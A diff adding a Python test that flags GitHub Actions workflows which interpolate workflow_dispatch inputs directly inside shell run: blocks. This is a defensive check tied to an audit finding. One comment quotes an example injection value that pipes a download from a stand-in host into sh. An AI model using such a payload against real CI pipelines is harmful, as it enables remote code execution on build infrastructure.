@@ -199,3 +199,39 @@ def test_workflow_force_push_is_allowlisted() -> None:
         "(see docs/adr/0024-force-with-lease-allowance-bot-snapshot-branches.md).\n"
         "Offenders:\n" + "\n".join(offenders)
     )
+
+
+# ---------------------------------------------------------------------------
+# A2: workflow_dispatch inputs must use env-var indirection, not direct
+# ${{ github.event.inputs.* }} interpolation inside run: blocks.
+# ---------------------------------------------------------------------------
+# Allowed: ${{ github.event.inputs.* }} inside an `env:` YAML key (GHA
+# processes these before the shell starts — no injection risk).
+# Forbidden: ${{ github.event.inputs.* }} appearing inside a shell `run:` block
+# (GHA template-preprocesses run: text BEFORE the shell parses it, so a
+# malicious input value like `"; curl evil.sh | sh #` would execute).
+# Audit pass-3 finding A2, 2026-06-10.
+_INPUT_EXPR_RE = re.compile(r"\$\{\{[^}]*github\.event\.inputs\.[^}]+\}\}")
+
+
+def test_workflow_dispatch_inputs_use_env_indirection() -> None:
+    """No ``${{ github.event.inputs.* }}`` expression may appear inside a
+    shell ``run:`` block — use a step-level or job-level ``env:`` mapping
+    instead and reference the value through its environment variable."""
+    offenders: list[str] = []
+    for wf_path in _iter_workflow_files():
+        for label, run_text in _iter_run_blocks(wf_path):
+            for line_no, line in enumerate(run_text.splitlines(), 1):
+                if line.lstrip().startswith("#"):
+                    continue
+                if _INPUT_EXPR_RE.search(line):
+                    offenders.append(
+                        f"  [{wf_path.name} :: {label}] line {line_no}: {line.rstrip()}"
+                    )
+    assert not offenders, (
+        "Direct ``${{ github.event.inputs.* }}`` interpolation found inside "
+        "run: blocks — shell-injection risk (audit pass-3 finding A2).\n"
+        "Move the input to the step's ``env:`` mapping and reference it as "
+        "``${ENV_VAR_NAME}`` in the shell script.\n"
+        "Offenders:\n" + "\n".join(offenders)
+    )
